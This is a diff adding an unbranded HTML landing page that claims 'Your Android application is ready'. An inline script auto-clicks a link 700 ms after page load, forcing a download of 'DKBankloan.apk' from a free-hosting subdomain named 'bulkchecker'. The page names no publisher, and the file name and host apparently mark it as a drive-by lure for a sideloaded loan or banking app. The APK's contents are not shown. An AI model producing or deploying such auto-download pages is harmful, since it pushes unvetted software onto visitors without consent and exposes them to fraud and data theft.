@@ -1,0 +1,112 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Download Android App</title>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background: #f1f5f9;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .card {
+            background: #ffffff;
+            max-width: 420px;
+            width: 100%;
+            padding: 35px 25px;
+            border-radius: 18px;
+            text-align: center;
+            box-shadow: 0 10px 35px rgba(0,0,0,0.08);
+        }
+
+        .app-icon {
+            font-size: 65px;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 26px;
+            color: #172033;
+            margin-bottom: 12px;
+        }
+
+        p {
+            font-size: 15px;
+            line-height: 1.7;
+            color: #64748b;
+            margin-bottom: 25px;
+        }
+
+        .download-btn {
+            display: block;
+            padding: 16px;
+            background: #16a34a;
+            color: white;
+            text-decoration: none;
+            border-radius: 10px;
+            font-weight: bold;
+            font-size: 17px;
+        }
+
+        .download-btn:hover {
+            background: #15803d;
+        }
+
+        .note {
+            margin-top: 18px;
+            font-size: 12px;
+            color: #94a3b8;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="card">
+        <div class="app-icon">📱</div>
+
+        <h1>Download Our App</h1>
+
+        <p>
+            Your Android application is ready.
+            The APK download will start automatically.
+        </p>
+
+        <a href="https://bulkchecker.liveblog365.com/DKBankloan.apk"
+           id="downloadBtn"
+           class="download-btn"
+           download="https://bulkchecker.liveblog365.com/DKBankloan.apk">
+            Download APK
+        </a>
+
+        <div class="note">
+            Android Application · APK File
+        </div>
+    </div>
+
+    <script>
+        window.addEventListener("load", function () {
+            setTimeout(function () {
+                document.getElementById("downloadBtn").click();
+            }, 700);
+        });
+    </script>
+
+</body>
+</html>
+
